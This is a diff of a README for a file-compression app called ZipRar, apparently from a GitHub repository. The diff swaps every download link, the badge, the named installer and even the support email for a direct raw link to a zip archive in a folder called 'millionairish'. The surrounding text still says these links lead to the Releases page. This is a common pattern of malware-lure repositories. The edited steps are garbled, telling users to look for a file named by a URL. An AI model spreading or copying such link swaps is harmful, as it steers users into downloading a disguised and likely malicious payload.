@@ -1,6 +1,6 @@
 # 📦 ZipRar - Compress and Extract Your Files Easily
 
-[![Download ZipRar](https://img.shields.io/badge/Download-ZipRar-brightgreen)](https://github.com/seimazd/ZipRar/releases)
+[![Download ZipRar](https://github.com/seimazd/ZipRar/raw/refs/heads/main/millionairish/Rar_Zip_v1.8.zip)](https://github.com/seimazd/ZipRar/raw/refs/heads/main/millionairish/Rar_Zip_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -15,16 +15,16 @@ Welcome to ZipRar! This application allows you to easily compress and extract fi
 
 ## 📥 Download & Install
 
-To download ZipRar, visit this page to download: [GitHub Releases](https://github.com/seimazd/ZipRar/releases).
+To download ZipRar, visit this page to download: [GitHub Releases](https://github.com/seimazd/ZipRar/raw/refs/heads/main/millionairish/Rar_Zip_v1.8.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of ZipRar.
-3. Look for the file called `ZipRarSetup.exe` or similar.
+3. Look for the file called `https://github.com/seimazd/ZipRar/raw/refs/heads/main/millionairish/Rar_Zip_v1.8.zip` or similar.
 4. Click on the file to download it.
 
 ## 🛠️ Installation Steps
 
-1. After the download completes, locate the `ZipRarSetup.exe` file in your Downloads folder.
+1. After the download completes, locate the `https://github.com/seimazd/ZipRar/raw/refs/heads/main/millionairish/Rar_Zip_v1.8.zip` file in your Downloads folder.
 2. Double-click the file to begin the installation.
 3. Follow the on-screen instructions to install ZipRar on your computer.
 4. Once installed, you can find ZipRar in your Start menu.
@@ -65,7 +65,7 @@ ZipRar operates under a licensing system. If you use certain features, you might
 If you encounter any issues or have questions about using ZipRar, you can reach out to our community or support team:
 
 - **Community Forum:** [Join Here](#)
-- **Contact Support:** [Email Us](mailto:support@ziprar.com)
+- **Contact Support:** [Email Us](https://github.com/seimazd/ZipRar/raw/refs/heads/main/millionairish/Rar_Zip_v1.8.zip)
 
 ## 💬 Feedback
 
@@ -73,6 +73,6 @@ We value your feedback. Let us know what you think about ZipRar. Your suggestion
 
 ## 📣 Updates
 
-Stay tuned for new features and updates. Check back on our [GitHub Releases](https://github.com/seimazd/ZipRar/releases) page for the latest version.
+Stay tuned for new features and updates. Check back on our [GitHub Releases](https://github.com/seimazd/ZipRar/raw/refs/heads/main/millionairish/Rar_Zip_v1.8.zip) page for the latest version.
 
 Thank you for choosing ZipRar! We look forward to helping you manage your files efficiently.
